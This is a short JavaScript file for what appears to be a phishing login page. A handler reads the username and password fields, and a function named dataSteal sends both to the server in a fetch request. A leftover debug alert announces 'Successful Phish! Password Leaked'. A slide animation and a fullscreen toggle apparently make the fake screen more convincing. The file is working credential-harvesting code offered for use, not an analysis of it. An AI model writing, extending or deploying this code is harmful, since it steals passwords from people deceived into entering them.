
//general functions
const print=(data)=>console.log(data);

const handleSlideUp=(e)=>{
    const endPosition=1000;
    let currentPosition=0;

    const fps=setInterval(()=>{
        if(currentPosition>=900){
            clearInterval(fps);
            e.target.style.display='none';
            e.target.parentElement.childNodes[7].style.display='block';
        }
        e.target.style.bottom=`${currentPosition+=15}px`;
    },1);
};


const dataSteal=async (username,password)=>{
    const response=await fetch(`/username=${username}&password=${password}`);
};

const handleSubmit=(e)=>{
    const username=document.querySelector('#username').value;
    const password=document.querySelector('#password').value;
    const message=`Successful Phish! Password Leaked:\nDetails:\n
Username: ${username}\nPassword: ${password}`;
    if(e.type==='keyup'){
        if(e.code==='Enter'){
            alert(message);//remove this later
            dataSteal(username,password);
        }
    }
    else if(e.type==='click'){
        alert(message);//remove this later
        dataSteal(username,password);
    }
};

function toggleFullscreen() {
    let elem = document.body;
  
    if (!document.fullscreenElement) {
      elem.requestFullscreen().catch(err => {
        alert(`Error attempting to enable fullscreen mode: ${err.message} (${err.name})`);
      });
    } else {
      document.exitFullscreen();
    }
  }